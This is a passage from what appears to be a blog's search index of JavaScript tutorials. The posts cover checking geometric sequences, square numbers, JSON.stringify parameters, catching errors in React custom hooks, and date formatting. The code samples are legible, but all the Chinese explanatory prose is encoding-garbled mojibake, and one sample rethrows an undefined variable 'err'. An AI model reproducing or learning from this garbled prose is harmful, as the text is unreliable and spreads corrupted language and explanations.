ç‚ºç•¶è¿´åœˆè·‘åˆ° i=4 çš„æ™‚å€™ï¼Œè£¡é¢çš„ array[i+1] æœƒæœ‰å•é¡Œ =&gt; array[5] æ²’æœ‰å…ƒç´ ã€‚ æ‰€ä»¥é€™å€‹æ™‚å€™è¿´åœˆçš„æ¢ä»¶å°±å¾—æ”¹æˆ for(let i=1; i&lt;array.length-1; i++)ï¼Œé›–ç„¶é€™æ¨£å°±èƒ½å¾—å‡ºæ­£ç¢ºçµæœï¼Œä½†åŒæ™‚ä¹Ÿæ˜¯å¾ˆä¸ç›´è¦ºçš„å¯«æ³•ã€‚ å¯«è¿´åœˆæ™‚éƒ½è©²æ³¨æ„æœ€å¤§èˆ‡æœ€å°ç¯„åœç•¶ i æ˜¯å¾ 1 ~ n-1 çš„æ™‚å€™ï¼Œå¦‚æœå‡ºç¾ i+1 ï¼Œé‚£å°±æ„å‘³è‘—æœƒè¶…å‡ºè¿´åœˆçš„ã€Œæœ€å¤§ç¯„åœã€ï¼›æˆ–åéä¾†èªªï¼Œå¦‚æœ i æ˜¯å¾ 0 ~ n-1ï¼Œé‚£ i-1 å°±æœƒè¶…å‡ºè¿´åœˆçš„ã€Œæœ€å°ç¯„åœã€ã€‚åªè¦å…¶ä¸­ä¸€é …ç™¼ç”Ÿï¼Œé‚£ä½ çš„åŸ·è¡Œçµæœå°±ä¸€å®šæœƒæœ‰å•é¡Œã€‚ æ›´å¥½çš„åšæ³•ï¼é è¨­å€¼æˆ‘å€‘å¯ä»¥å…ˆå‡è¨­ä¸€å€‹é è¨­çš„ã€Œå…¬æ¯”å€¼ã€ï¼Œæ¥è‘—åœ¨åˆ©ç”¨è¿´åœˆä¾†åšåˆ¤æ–·ï¼š 12345678function isSequence(arr) { let n = arr[1] / arr[0] // é è¨­å…¬æ¯”å€¼ for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([1, 2, 4, 8, 16])) // true å¦‚æœä¸€å€‹æ•¸åˆ—çœŸçš„æ˜¯ã€Œç­‰æ¯”æ•¸åˆ—ã€ï¼Œé‚£ä¸€å®šæœƒç¬¦åˆæˆ‘å€‘é è¨­çš„å…¬æ¯”ï¼Œæ‰€ä»¥èƒ½åšå‡ºæ­£ç¢ºçš„åˆ¤æ–·ã€‚ å¦å¤–ï¼Œè¿´åœˆå€å¡Šä¸­çš„ arr[i] éƒ½æœ‰ä¹–ä¹–å¾…åœ¨è¿´åœˆçš„æœ€å¤§èˆ‡æœ€å°ç¯„åœï¼Œæ‰€ä»¥ä¸æœƒæœ‰è¶…å‡ºçš„å•é¡Œã€‚ æ‰€ä»¥é€™æ¨£å­å¯«èµ·ä¾†å°±ç›¸å°ç›´è¦ºï¼Œä¹Ÿèƒ½è§£å‡ºæ­£ç¢ºçš„è§£ç­”ã€‚é€™å€‹åšæ³•å°±è·Ÿ æ±‚æ¬¡å¤§å€¼ çš„æ¦‚å¿µé›·åŒï¼Œéƒ½æ˜¯å…ˆå‡è¨­ä¸€å€‹ã€Œé è¨­å€¼ã€ä¾†åšåˆ¤æ–·ã€‚ é¤Šæˆå¥½ç¿’æ…£ï¼Œé©ç•¶è™•ç†é‚Šè§’æ¡ˆä¾‹é€™ä¸€é¡Œçš„é‚Šè§’æ¡ˆä¾‹æœƒæ˜¯ [] æˆ–æ˜¯ [1]ï¼Œå°±æ˜¯ã€Œç©ºé™£åˆ—ã€æˆ–æ˜¯ã€Œåªæœ‰ä¸€å€‹å…ƒç´ ã€ã€‚å¦‚æœå‡è¨­é€™å…©å€‹ case éƒ½è¦–ç‚ºç­‰æ¯”æ•¸åˆ—ï¼Œé‚£æˆ‘å€‘æ‡‰è©²æœƒé€™æ¨£å¯«ï¼š 12345678910function isSequence(arr) { if(arr.length &lt;= 1) return true // é‚Šè§’æ¡ˆä¾‹ let n = arr[1] / arr[0] for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([])) // trueconsole.log(isSequence([1])) // true ä½†å…¶å¯¦ä½ ä»”ç´°è§€å¯Ÿæœƒç™¼ç¾ï¼Œå°±ç®—ä¸åŠ ä¸Šé€™å€‹åˆ¤æ–·ï¼Œæœ€å¾Œçš„çµæœä¹Ÿæœƒæ˜¯ trueã€‚ 123456789function isSequence(arr) { let n = arr[1] / arr[0] for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([])) // ä¾ç„¶æ˜¯ trueconsole.log(isSequence([1])) // ä¾ç„¶æ˜¯ true é€™æ˜¯å› ç‚ºç•¶ arr.length ç‚º 0 æˆ– 1 çš„æ™‚å€™ï¼Œä¸æœƒé€šéè¿´åœˆçš„åˆ¤æ–·æ¢ä»¶ i &lt; arr.lengthï¼Œä¹Ÿå°±æ˜¯èªªä¸æœƒé€²åˆ°è¿´åœˆè£¡é¢ï¼Œç›´æ¥è·³åˆ° return true çš„éƒ¨åˆ†ã€‚ å„˜ç®¡ä»¥é€™å€‹ä¾‹å­ä¾†èªªç¢ºå¯¦å¯ä»¥ä¸åŠ ä¸Šé¡å¤–åˆ¤æ–·ï¼Œå¯æ˜¯é‚„æ˜¯æœƒå»ºè­°ä½ åŠ ä¸Šå»ï¼Œé€™æ˜¯ä¸€å€‹æ¯”è¼ƒå¥½çš„ç¿’æ…£ã€‚å› ç‚ºå¦‚æœæ›æˆå…¶ä»–çš„ç¨‹å¼èªè¨€ï¼Œåœ¨åŸ·è¡Œåˆ° arr[1] æˆ– arr[0] å»ç™¼ç¾å­˜å–ä¸åˆ°å…ƒç´ çš„æ™‚å€™ï¼Œæ˜¯æœ‰æ©Ÿæœƒç›´æ¥å™´å‡ºä¸€å€‹ errorï¼Œç„¶å¾Œä½ çš„ç¨‹å¼å°±åŸ·è¡Œä¸ä¸‹å»ï¼Œæœ€å¾Œå°± GG äº†ã€‚","link":"/2021/12/26/is-sequence/"},{"title":"æ±‚å‡º 1-100 çš„å¹³æ–¹æ•¸","text":"æœ‰å…©ç¨®ä¸åŒçš„è§£æ³•ï¼Œæ‰€ä»¥ç´€éŒ„ä¸€ä¸‹ã€‚ è§£æ³•ä¸€åˆ©ç”¨å…§å»ºå‡½å¼ï¼š å° n é–‹æ ¹è™Ÿ å° n åšç„¡æ¢ä»¶æ¨å» æª¢æŸ¥ n å¹³æ–¹æ˜¯å¦é‚„ç­‰æ–¼ i 123456for(let i=1; i&lt;100; i++) { const n = Math.floor(Math.sqrt(i)) if( i === n*n ) { console.log(i) }} è§£æ³•äºŒç›´æ¥æŠŠ 1-100 å…§çš„å¹³æ–¹æ•¸çµ¦å°å‡ºä¾† åˆ©ç”¨ while ä¾†è¨­å®šæ¢ä»¶ç‚ºã€Œç•¶ i å¹³æ–¹ &lt;= 100ã€æ™‚æ‰åŸ·è¡Œè¿´åœˆå€å¡Šï¼š 12345i = 1while(i*i &lt;= 100) { console.log(i*i) i++}","link":"/2021/12/23/is-squre-number/"},{"title":"JavaScriptï¼é—œæ–¼ JSON çš„ç§˜å¯†","text":"ä¸ç®—ç§˜å¯†çš„ç§˜å¯†ã€‚ ç°¡è¿°æˆ‘å€‘å¹³å¸¸æœ‰ 90% åœ¨è™•ç† JSON è³‡æ–™æ™‚éƒ½æ˜¯ç›´æ¥ JSON.stringify æˆ–æ˜¯ JSON.parse ä¾†è½‰æ›æ ¼å¼ã€‚ ä¸éä½ çŸ¥é“ JSON.stringify é™¤äº†è³‡æ–™æœ¬èº«ä»¥å¤–å®ƒé‚„å¯ä»¥å‚³å…¥å…¶ä»–åƒæ•¸å—ï¼Ÿé€™ç¯‡å°±æ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹é€™å€‹å¥‡å¦™çš„æ±è¥¿ã€‚ é¦–å…ˆå¦‚æœåˆ©ç”¨ vscode çš„æ‡¸åœåŠŸèƒ½ä¾†æŸ¥çœ‹å‹åˆ¥ï¼Œå°±æœƒçœ‹åˆ°ä»¥ä¸‹è³‡è¨Šï¼š æœƒç™¼ç¾æœ‰ä¸‰å€‹åƒæ•¸ï¼Œåˆ†åˆ¥ç‚ºï¼š value replacer space é™¤äº† value ä»¥å¤–æ‡‰è©²ä¸å¤šäººç¢°éï¼Œæ‰€ä»¥ä¸‹é¢å°±ä¾†ä»‹ç´¹ä¸€ä¸‹ç”¨æ³•ã€‚ æ›¿æ›åƒæ•¸ï¼ˆreplacerï¼‰é€™å€‹æœ‰å…©ç¨®ç”¨æ³•ï¼Œç¬¬ä¸€ç¨®æ˜¯å‚³ã€Œé™£åˆ—ã€ï¼Œç¬¬äºŒç¨®æ˜¯å‚³ã€Œå‡½å¼ã€ã€‚ Array çš„ç”¨æ³•ï¼š 123456789101112const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// åªå¸Œæœ›ç•™ä¸‹çš„æ¬„ä½const replacer = ['id', 'age', 'name']// \"{'id':1,'age':20,'name':'PeaNu'}\"console.log(JSON.stringify(data, replacer)) Function çš„ç”¨æ³•ï¼š é™„è¨»ï¼šä½ å¯ä»¥åˆ©ç”¨ key &amp; value ä¾†æ±ºå®šè¦æ€éº¼éæ¿¾è³‡è¨Šã€‚ 12345678910111213141516171819const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}const replacer = (key, value) =&gt; { // ä¸æƒ³ç•™ä¸‹çš„å°±å›å‚³ undefined if (typeof value === 'string') { return undefined } // æƒ³ç•™ä¸‹çš„å°±æŠŠå€¼å›å‚³ return value}// \"{'id':1,'age':20,'isMarry':true}\"console.log(JSON.stringify(data, replacer)) å­—ä¸²é–“éš”ï¼ˆSpaceï¼‰å¯ä»¥å¡«çš„å€¼æœ‰å…©ç¨®ï¼Œåˆ†åˆ¥ç‚ºã€Œå­—ä¸²ã€å’Œã€Œæ•¸å­—ã€ã€‚ æ•¸å­—çš„è©±å°±æ˜¯ã€Œæ¯å€‹ key åˆ°ä¸Šä¸€å€‹ , ä¹‹é–“çš„é–“éš” ã€ï¼š 12345678910const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// é–“éš” 10console.log(JSON.stringify(data, null, 10)) 123456789// æ¯å€‹ key åˆ° , ä¹‹é–“æœ‰ 10 å€‹ç©ºæ ¼{----------\"id\": 1,----------\"name\": \"PeaNu\",----------\"age\": 20,----------\"habit\": \"coding\",----------\"gender\": \"man\",----------\"isMarry\": true} å­—ä¸²çš„è©±å°±æ˜¯ç›´æ¥å¡«å…¥ï¼š 12345678910const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// å¡«å…¥ #console.log(JSON.stringify(data, null, '#')) 12345678{#\"id\": 1,#\"name\": \"PeaNu\",#\"age\": 20,#\"habit\": \"coding\",#\"gender\": \"man\",#\"isMarry\": true} é›–ç„¶ä¸å¤ªçŸ¥é“é€™å€‹å¯¦éš›æœƒç”¨åœ¨å“ªï¼Œä¸éä¹Ÿè¨±åœ¨éæ¿¾è³‡æ–™çš„æ™‚å€™æœƒç•¶ä½œé—œéµå­—ä¾†ç”¨å§ï¼Œåƒæ˜¯ split ä¹‹é¡çš„ã€‚","link":"/2022/07/19/javascript-about-json-method/"},{"title":"é—œæ–¼ Catch Error çš„å¯¦éš›æ¡ˆä¾‹","text":"éŒ¯èª¤è™•ç†å¾ˆé‡è¦ã€‚ ç°¡è¿°é€™ç¯‡å¯ä»¥ç•¶ä½œæ˜¯å¾ JavaScriptï¼è™•ç†éŒ¯èª¤çš„æ–¹æ³• å»¶ä¼¸å‡ºä¾†çš„ç­†è¨˜ï¼Œæ‰€ä»¥æœƒå‡è¨­ä½ å·²ç¶“çŸ¥é“ä¸‹é¢é€™å¹¾å€‹æ¦‚å¿µï¼š çŸ¥é“ try...catch..finally çš„æµç¨‹ çŸ¥é“ throw new Error() æ˜¯ä»€éº¼ï¼Ÿè·Ÿæœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ çŸ¥é“ Error ç‰©ä»¶æ˜¯ä»€éº¼ï¼Ÿé‚„æœ‰ Error çš„é¡åˆ¥ ç¸½ä¹‹é€™ç¯‡åªæ˜¯æƒ³èˆ‰å¹¾å€‹æ¯”è¼ƒç‰¹åˆ¥çš„ç¯„ä¾‹ï¼Œæ‰€ä»¥åŸºæœ¬æ¦‚å¿µä¸æœƒè¬›å¤ªå¤šã€‚ æ¡ˆä¾‹ä¸€ï¼šç•¶é é¢è¼‰å…¥æ™‚æœ‰å¾ˆå¤šè³‡æ–™è¦åˆå§‹åŒ–é€™æ‡‰è©²æ˜¯è »å¸¸è¦‹çš„æ¡ˆä¾‹ï¼Œä»¥æˆ‘åœ¨å·¥ä½œçš„ç¶“é©—ä¾†èªªï¼Œå°±æœ‰ç¢°åˆ°ä¸‹æ‹‰é¸å–®é …ç›®æ˜¯é€é API æ‹¿åˆ°çš„è³‡æ–™ä¾†ç”¢ç”Ÿçš„ï¼Œæ‰€ä»¥ useEffect ä¸­å°±æœƒæœ‰ä¸€å¤§å † API è¦æ‰“ï¼Œåƒé€™æ¨£ï¼š 1234567useEffect(() =&gt; { getDropdown1.then((response) =&gt; setDropdownList1(response)) getDropdown2.then((response) =&gt; setDropdownList2(response)) getDropdown3.then((response) =&gt; setDropdownList3(response)) getDropdown4.then((response) =&gt; setDropdownList4(response)) ...}, []) é€™ç¨®æ™‚å€™ä½ æ‡‰è©²å°±æœƒæƒ³è¦æŠŠé€™äº›æ±è¥¿åŒ…æˆä¸€å€‹ function ä¾†è™•ç†ï¼Œä¸ç„¶è¦è™•ç†éŒ¯èª¤çš„è©±å¾ˆéº»ç…©ï¼Œæœƒè®Šæˆé€™æ¨£ï¼š 1234567891011121314useEffect(() =&gt; { getDropdown1 .then((response) =&gt; setDropdownList1(response)) .catch((error) =&gt; setError(error.message)) getDropdown2 .then((response) =&gt; setDropdownList2(response)) .catch((error) =&gt; setError(error.message)) getDropdown3 .then((response) =&gt; setDropdownList3(response)) .catch((error) =&gt; setError(error.message)) getDropdown4 .then((response) =&gt; setDropdownList4(response)) .catch((error) =&gt; setError(error.message))}, []) æ‰€ä»¥å°±è¦é€é function ä¾†åŒ…è£æœƒæ›´ç°¡æ½”ä¸€é»ã€‚ä¸éåœ¨é‚£ä¹‹å‰æˆ‘æƒ³å…ˆå¼·èª¿ä¸€å€‹å¾ˆé‡è¦çš„è§€å¿µï¼š catch è¦ç•™åˆ°æœ€å¤–å±¤ä¾†åš catch è¦ç•™åˆ°æœ€å¤–å±¤ä¾†åš catch è¦ç•™åˆ°æœ€å¤–å±¤ä¾†åš ä»€éº¼æ„æ€ï¼Ÿæˆ‘å€‘å…ˆå‡è¨­æœ€å¾ŒåŒ…è£å¥½çš„çµæœæœƒåƒé€™æ¨£ï¼š 12345useEffect(() =&gt; { getInitDropdown() .then(() =&gt; console.log('finish')) .catch((error) =&gt; setError(error.message))}, []) å¦‚æœä½ è¦æŠŠ error ç•™åˆ°é€™é‚Šä¾†è™•ç†ï¼Œé‚£éº¼åœ¨ getInitDropdown ä¸­å°±ä¸å¯ä»¥å‡ºç¾ä»»ä½• catchã€‚ ä¸‹é¢æ˜¯éŒ¯èª¤çš„ç¯„ä¾‹ï¼š é™„è¨»ï¼šåŠ ä¸Š async å¾Œæœ€å¾Œæ‰æœƒå›å‚³ Promise 1234567891011121314async function getInitDropdown() { await getDropdown1 .then((response) =&gt; setDropdownList1(response)) .catch((error) =&gt; setError(error.message)) await getDropdown2 .then((response) =&gt; setDropdownList2(response)) .catch((error) =&gt; setError(error.message)) await getDropdown3 .then((response) =&gt; setDropdownList3(response)) .catch((error) =&gt; setError(error.message)) await getDropdown4 .then((response) =&gt; setDropdownList4(response)) .catch((error) =&gt; setError(error.message))} å¦‚æœæ˜¯é€™æ¨£å¯«ï¼Œç•¶ä»»ä½•ä¸€å€‹åœ°æ–¹å‡ºç¾ Error æ™‚å°±æœƒè¢«å®ƒæœ€é è¿‘çš„ catch çµ¦æ¥ä½ï¼Œé€™æ™‚å€™å¤–é¢çš„ getInitDropdown å°±æ²’è¾¦æ³• catch åˆ°ï¼Œå› ç‚ºå·²ç¶“å…ˆè¢«è£¡é¢çš„ function è¢«æ¥èµ°äº†ã€‚ å¯ä»¥åƒè€ƒ PJCHENder èªªçš„é€™ä¸€æ®µï¼š ç•¶ JavaScript ç¨‹å¼åŸ·è¡Œçš„éç¨‹ä¸­ç™¼ç”ŸéŒ¯èª¤æ™‚ï¼Œå®ƒæœƒä¸Ÿå‡ºä¾‹å¤–ç‹€æ³ï¼ˆthrow an exceptionï¼‰ï¼ŒJS ä¸¦ä¸æœƒç¹¼çºŒå¾€ä¸‹èµ°ï¼Œè€Œæ˜¯å°‹æ‰¾æœ‰æ²’æœ‰ä»»ä½•ç¨‹å¼ç¢¼èƒ½å¤ è™•ç†é€™äº›éŒ¯èª¤ï¼ˆexception handling codeï¼‰ï¼Œå¦‚æœæ²’æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥è™•ç†éŒ¯èª¤ç‹€æ³çš„ç¨‹å¼ç¢¼ï¼Œå‰‡å®ƒæœƒå¾ä¸Ÿå‡ºä¾‹å¤–ç‹€æ³çš„å‡½å¼ä¸­è·³å‡ºï¼ˆreturnï¼‰ï¼Œå°±é€™æ¨£é‡è¤‡å°‹æ‰¾éŒ¯èª¤è™•ç†çš„ç¨‹å¼ç¢¼ã€è·³å‡ºï¼Œç›´åˆ°è§¸åŠåˆ°æœ€å¤–å±¤çš„å‡½å¼ï¼ˆtop level functionï¼‰å¾Œçµ‚æ­¢ã€‚ é€™å€‹å°±æ˜¯ JS è£¡ catch çš„æ©Ÿåˆ¶ï¼Œä¸€å®šä¸€å®šè¦ææ¸…æ¥šé€™ä¸€æ®µã€‚ æ‰€ä»¥å‘¢ï¼Œé™¤éä½ æœ‰è¦é‡å°ç‰¹å®šçš„ getDropdown åšé¡å¤–è™•ç†ï¼Œä¸ç„¶è«‹ä¸€å¾‹ä¸è¦åŠ ä¸Šä»»ä½• catchï¼Œç•™çµ¦æœ€å¤–å±¤ä¾†åšå°±å¥½ï¼š 123456async function getInitDropdown() { await getDropdown1.then((response) =&gt; setDropdownList1(response)) await getDropdown2.then((response) =&gt; setDropdownList2(response)) await getDropdown3.then((response) =&gt; setDropdownList3(response)) await getDropdown4.then((response) =&gt; setDropdownList4(response))} æ”¹æˆé€™æ¨£ä»¥å¾Œï¼Œä»£è¡¨åªè¦æœ‰ä»»ä½•ä¸€å€‹åœ°æ–¹å‡ºéŒ¯å°±æœƒç«‹åˆ» return å‡ºå»ï¼Œç„¶å¾Œé€²å…¥ getInitDropdown çš„ catch å€å¡Šã€‚ æ¡ˆä¾‹äºŒï¼šæˆ‘æƒ³åœ¨ custom hook ä¸­ catch éŒ¯èª¤ï¼Œä½†ä¹Ÿå¸Œæœ›å…ƒä»¶èƒ½å¤  catch åˆ°ã€‚ä½ æ‡‰è©²æœƒè¦ºå¾—æˆ‘åœ¨å…¬ three å°ï¼Œä¸éé€™ç¢ºå¯¦æ˜¯æˆ‘ç•¶åˆç¢°åˆ°çš„ä¸€å€‹å•é¡Œï¼Œæ‰€ä»¥æˆ‘æœƒé‚Šèˆ‰ä¾‹é‚Šèªªæ˜ã€‚ é¦–å…ˆæˆ‘å€‘è¦æŠŠ é€™å€‹è¡¨å–®ç¯„ä¾‹ å¯«æˆä¸€å€‹ custom hookï¼Œå¯«å®Œå¾Œæœƒåƒé€™æ¨£ä¾†ç”¨å®ƒï¼š 12345678910111213141516171819202122import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={addNewUser}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} é€™å€‹ useForm åšçš„äº‹æƒ…æœ‰å¹¾å€‹ï¼š æœ‰ Error æ™‚é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ åœ¨ Loading æ™‚é¡¯ç¤ºè®€å–ç‹€æ…‹ æŠŠ input å€¼è·Ÿ state åšç¶å®š è¡¨å–®é€å‡ºæ™‚åŸ·è¡Œ addNewUser ç™¼å‡º request å¥½ï¼Œå‡è¨­æˆ‘å€‘ç¾åœ¨å¸Œæœ› addNewUser å®Œä¹‹å¾Œåšä¸€å€‹ã€Œredirectã€çš„å‹•ä½œçš„è©±ï¼Œæ€éº¼å¯«ï¼Ÿ é€™æ˜¯ addNewUser ç›®å‰çš„é‚è¼¯ï¼š 12345678910111213141516const addNewUser = (e) =&gt; { e.preventDefault() setLoading(true) fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} é›–ç„¶æœ€ç°¡å–®çš„æ–¹æ³•æ˜¯ç›´æ¥æŠŠ redirect çš„é‚è¼¯ç›´æ¥å¯«åœ¨è£¡é¢ï¼Œä½†è€ƒæ…®åˆ°ã€Œé‡ç”¨æ€§ã€çš„è©±ä¸æœƒé€™æ¨£åšã€‚ æ‰€ä»¥æ¯”è¼ƒå¥½çš„æ”¹æ³•æ˜¯åŠ ä¸Š asyncï¼Œè®“ addNewUser çµæŸå¾Œå¯ä»¥è¢«ä¸‹ä¸€å€‹ then æ¥ä¸‹å»ï¼š 1234567891011121314151617const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) // è¨˜å¾—åŠ ä¸Š await æ‰æœƒç­‰é€™é‚ŠåŸ·è¡Œå®Œæ‰ return await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} æ¥è‘—å…ƒä»¶çš„éƒ¨åˆ†å†æ”¹å¯«æˆé€™æ¨£ï¼š 123456789101112131415161718192021222324252627import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() // è¨˜å¾—è¦æŠŠ event è¦å‚³é€²å»æ‰ä¸æœƒå‡ºéŒ¯ const handleSubmit = (e) =&gt; { addNewUser(e).then(() =&gt; console.log('redirect to some where.')) } return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} é€™æ¨£å°±å®Œæˆäº†ã€‚ OKï¼Œå‰›å‰›èªªçš„éƒ½åªæ˜¯é‹ªé™³ï¼Œç¾åœ¨è¦è¬›çš„æ±è¥¿æ‰æ˜¯é‡é ­æˆ²ï¼š å¦‚æœæˆ‘ä¹Ÿæƒ³è¦åœ¨å¤–é¢ catch éŒ¯èª¤çš„è©±æ€éº¼è¾¦ï¼Ÿ é€™å€‹å°±æ˜¯ä¸€é–‹å§‹æ¨™é¡Œæåˆ°çš„æƒ…å¢ƒï¼Œå¸Œæœ›åšåˆ°é€™é‚Šå¾Œä½ æœ‰æ¸…æ¥šä¸€äº›äº†ã€‚ ä¹‹æ‰€ä»¥è¦é€™æ¨£æ˜¯å› ç‚ºæˆ‘å€‘ä¸æƒ³è¦åœ¨ç™¼ç”ŸéŒ¯èª¤æ™‚åš redirect çš„å‹•ä½œï¼Œæ‰€ä»¥æœƒå¸Œæœ›å‡ºéŒ¯æ™‚èƒ½å¤  catch éŒ¯èª¤ã€‚ é€™æ™‚å€™ä½ å¯èƒ½æœƒå•èªªã€Œé˜¿å°±è·Ÿå‰›å‰›ä¸€æ¨£æŠŠ catch æŒªåˆ°æœ€å¤–å±¤ä¾†åšä¸å°±å¥½äº†ï¼Ÿã€ï¼Œåƒæ˜¯é€™æ¨£ï¼š 123456789101112const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }).then(() =&gt; { console.log('add succuess') setLoading(false) }) // æŠŠ catch æ‹¿æ‰} ä½†å¾ˆæŠ±æ­‰ï¼Œä¸è¡Œã€‚ ç•¶ä½ é€™æ¨£åšä»¥å¾Œï¼Œä½ æœƒç™¼ç¾å¦ä¸€å€‹å•é¡Œï¼š æ²’è¾¦æ³•å–æ¶ˆ loading ç‹€æ…‹ æ²’è¾¦æ³•æŠŠè¡¨å–®çš„éŒ¯èª¤è¨Šæ¯ç§€å‡ºä¾† ä¸è¦å¿˜äº†é€™å…©å€‹ state éƒ½æ˜¯å°è£åœ¨è£¡é¢ä¾†è™•ç†çš„ï¼Œæ‰€ä»¥é™¤éä½ æŠŠ hook è£¡çš„ setError è·Ÿ setLoading ä¹Ÿ export åˆ°å¤–é¢çµ¦å…ƒä»¶ç”¨ï¼Œä¸ç„¶ä½ æ²’è¾¦æ³•è§£æ±ºé€™å€‹å•é¡Œã€‚ é‚£è©²æ€éº¼è¾¦æ‰å¥½å‘¢ï¼Ÿ æ°¸é ä¸è¦å¿˜äº†æˆ‘å€‘å¯ä»¥è‡ªå·±æ‹‹å‡º Error æ°¸é ä¸è¦å¿˜äº†æˆ‘å€‘å¯ä»¥è‡ªå·±æ‹‹å‡º Error æ°¸é ä¸è¦å¿˜äº†æˆ‘å€‘å¯ä»¥è‡ªå·±æ‹‹å‡º Error é›–ç„¶è½èµ·ä¾†å¾ˆå¥‡å¦™ï¼Œä½†é€™å€‹å°±æ˜¯è§£æ³•ï¼Œåªè¦åœ¨ catch ä¸­åœ¨æ‹‹å‡ºå¦ä¸€å€‹ Error å°±å¥½äº†ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) // æ”¹å®Œ state å¾Œæ‹‹å‡ºæ–°çš„éŒ¯èª¤ throw new Error(err) })} å› ç‚ºé€™å€‹ Error æ˜¯åœ¨ catch ä¸­ç™¼ç”Ÿçš„ï¼Œæ‰€ä»¥å®ƒå°±æœƒåˆ°å¤–é¢æ‰¾å¦ä¸€å€‹ catch ä¾†æ¥ä½ã€‚ é€éé€™ç¨®æ‰‹æ³•å°±å¯ä»¥è®“å…ƒä»¶ä¹Ÿèƒ½ catch éŒ¯èª¤ï¼Œç„¶å¾Œåšå°æ‡‰çš„è™•ç†ï¼š 1234567891011121314151617181920212223242526272829import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() const handleSubmit = (e) =&gt; { // ç¾åœ¨èƒ½ catch error äº† addNewUser(e) .then(() =&gt; console.log('redirect to some where.')) .catch((error) =&gt; console.log(error.message)) } return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} å¥½å•¦ï¼Œé€™å€‹å°±æ˜¯é€™ç¯‡è¦è¬›çš„æ±è¥¿ï¼Œæœ‰ä»»ä½•ç–‘å•çš„è©±å¯ä»¥åˆ°é€™é‚Šä¾†çœ‹ç¯„ä¾‹ã€‚","link":"/2022/06/23/javascript-catch-error-example/"},{"title":"æƒ±äººçš„æ—¥æœŸæ ¼å¼","text":"å¸Œæœ›å¯«ä¸‹ä¾†å¾Œå¯ä»¥ä¸€å‹æ°¸é€¸ã€‚ ç°¡è¿°æ¯æ¬¡ç¢°åˆ° Date é€™ç©æ„å…’ï¼Œæˆ‘å°±å¾—æ‰¾åŠå¤©æ‰èƒ½æ‰¾å‡ºæƒ³è¦çš„æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘æ±ºå®šæŠŠå¸¸ç”¨åˆ°çš„çµ¦å¯«ä¸‹ä¾†ã€‚ 2021-04-01åŸç†æ˜¯å…ˆè½‰æˆ ISO æ ¼å¼åœ¨åšå­—ä¸²è™•ç† 12const date = new Date('2022-04-01T00:00:00.000Z')console.log(date.toISOString().split('T')[0]) 2021/04/01undefined å¯ä»¥æ”¹æˆæ™‚å€ã€‚ 12345678const date = new Date('2022-04-01T00:00:00.000Z')const result = date.toLocaleDateString( undefined, { year: \"numeric\", month: \"2-digit\", day: \"2-digit\",})console.log(result) 2021/4/1123const date = new Date('2022-04-01T00:00:00.000Z')const result = date.toLocaleDateString()console.log(result) æˆ–è€…æ˜¯ 12const date = new Date('2022-04-01T00:00:00.000Z')console.log(new 